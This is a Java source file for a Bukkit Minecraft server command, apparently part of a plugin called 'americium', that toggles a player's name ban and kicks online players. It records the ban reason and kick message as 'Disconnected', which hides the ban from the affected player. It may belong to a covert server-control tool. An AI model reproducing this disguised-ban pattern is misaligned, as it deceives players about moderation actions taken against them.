package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Ban implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"ban"};
    }

    @Override
    public String getDescription() {
        return "Toggles a player's ban off or on.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: ban <player>");
            return;
        }

        String player = args[0];

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            BanList banlist = Bukkit.getBanList(BanList.Type.NAME);
            if (banlist.isBanned(player)) {
                banlist.pardon(player);
                sender.sendMessage(Colors.Prefix + Colors.Success + "Attempting to pardon player " + player + "!");
                return;
            }

            // Need to kick as well!
            banlist.addBan(player, "Disconnected", null, null);
            Player connectedPlayer = Bukkit.getPlayer(player);
            if (connectedPlayer != null) {
                connectedPlayer.kickPlayer("Disconnected");
                sender.sendMessage(Colors.Prefix + Colors.Success + "Added " + player + " to the ban list and kicked them!");
                return;
            }

            sender.sendMessage(Colors.Prefix + Colors.Success + "Added " + player + " to the ban list!");
        });
    }
}
